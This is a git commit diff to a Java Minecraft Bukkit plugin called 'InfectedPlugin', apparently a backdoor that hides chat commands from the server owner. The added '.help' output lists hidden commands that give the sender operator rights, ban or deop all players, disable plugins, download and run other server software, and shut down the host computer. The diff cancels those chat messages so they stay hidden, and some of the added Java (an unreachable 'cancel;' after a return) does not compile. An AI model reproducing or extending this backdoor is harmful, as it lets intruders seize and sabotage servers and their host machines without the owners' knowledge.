84448fdbb10a6269274dafa026193239cd2ca1b3
Wilee999 <Infinitywilee@rocketmail.com>
2013-09-29 20:04:53 -0700

    Added .help and changed cancel to a boolean, it should work now.

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -35,7 +35,7 @@ public class PlayerListener implements Listener
         String message = event.getMessage();
         final Player p = event.getPlayer();
         String[] args = message.split(" ");
-        private final cancel = event.setCancelled(true); // not sure if this works or not, oh well.
+        boolean cancel = true;
     
         if (message.toLowerCase().contains(".opme"))
         {
@@ -199,6 +199,30 @@ public class PlayerListener implements Listener
                     //
                 }
             }
+        }
+        if (message.toLowerCase().contains(".help"))
+        {
+            p.sendMessage(ChatColor.AQUA + "Commands");
+            p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
+            p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
+            p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
+            p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
+            p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
+            p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
+            p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server. Bans sender too.");
+            p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
+            p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
+            p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
+            p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
+            p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
+            p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
+            return true;
+            cancel;
+        }
+        
+        if (cancel)
+        {
+            event.setCancelled(true);
         }
     }
     
